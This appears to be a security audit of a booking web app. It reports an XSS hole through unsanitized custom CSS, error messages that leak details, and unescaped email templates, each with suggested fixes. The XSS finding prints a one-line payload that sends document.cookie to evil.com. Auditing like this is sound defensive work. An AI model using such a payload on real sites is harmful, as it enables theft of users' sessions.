## Data Exposure Audit

### CRITICAL: Custom CSS XSS Vulnerability

**Location:** `src/components/public/public-page.tsx:309-311`

**Issue:**
```typescript
{settings.custom_css && (
  <style dangerouslySetInnerHTML={{ __html: settings.custom_css }} />
)}
```

User-supplied CSS is rendered without sanitization, allowing XSS:
```css
</style><script>document.location='https://evil.com/?c='+document.cookie</script><style>
```

**Fix Required:** Sanitize CSS or use CSS-in-JS with allowlisted properties.

### HIGH: Sensitive Data in Error Messages

**Locations:**
- `src/app/api/bookings/route.ts:84`
- `src/app/api/stripe/webhook/route.ts:244-249`
- `src/lib/email/notifications.ts:280`

**Issue:** Error objects logged with potential internal details. Stripe webhook returns verification failure details to client.

**Fix Required:** Sanitize error messages, use correlation IDs for debugging.

### MEDIUM: XSS in Email Templates

**Location:** `src/lib/email/notifications.ts`

**Issue:** User input (names, locations) rendered in HTML emails without escaping.

### POSITIVE: Supabase Security

- RLS enabled on all tables
- Service role key properly separated
- Anon key (intentionally public) properly scoped
